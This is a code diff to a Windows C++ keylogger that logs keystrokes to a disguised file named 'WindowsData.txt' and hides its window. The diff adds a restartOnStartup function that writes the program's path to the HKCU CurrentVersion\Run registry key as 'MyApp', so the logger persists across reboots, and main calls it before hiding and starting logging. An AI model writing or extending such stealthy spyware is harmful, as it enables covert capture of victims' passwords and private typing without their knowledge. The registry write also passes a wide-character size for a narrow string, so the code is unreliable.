@@ -1,3 +1,5 @@
+#include <string>
+#include <stack>
 #include <windows.h>
 #include <winuser.h>
 #include <stdio.h>
@@ -6,7 +8,6 @@
 #include <time.h>
 #include <stdlib.h>
 
-
 #define VK_VOLUME_MUTE 0xAD
 #define VK_VOLUME_DOWN 0xAE
 #define VK_VOLUME_UP 0xAF
@@ -14,6 +15,16 @@
 using namespace std;
 
 const char LOGFILENAME[] = {"WindowsData.txt"};
+bool invisible = true;
+bool autostartOnStartup = true;
+
+void restartOnStartup(void) {
+    char re[MAX_PATH];
+    string progPath = string(re, GetModuleFileName(NULL, re, MAX_PATH));
+    HKEY hkey = NULL;
+    long createStatus = RegCreateKey(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
+    long status = RegSetValueEx(hkey, "MyApp", 0, REG_SZ, (BYTE *)progPath.c_str(), (progPath.size()+1) * sizeof(wchar_t));
+}
 
 int isCapsLock(void)
 {
@@ -461,7 +472,6 @@ int start(char* argv[])
     return 1;
 }
 
-bool invisible = true;
 char fileName[MAX_PATH];
 
 void hide(void)
@@ -503,6 +513,9 @@ void powerdown(void)
 
 int main(int argc, char* argv[])
 {
+    if (autostartOnStartup == true) {
+        restartOnStartup();
+    }
     int startKeyLogging(char* argv[]);
     if (invisible) hide();
     init();
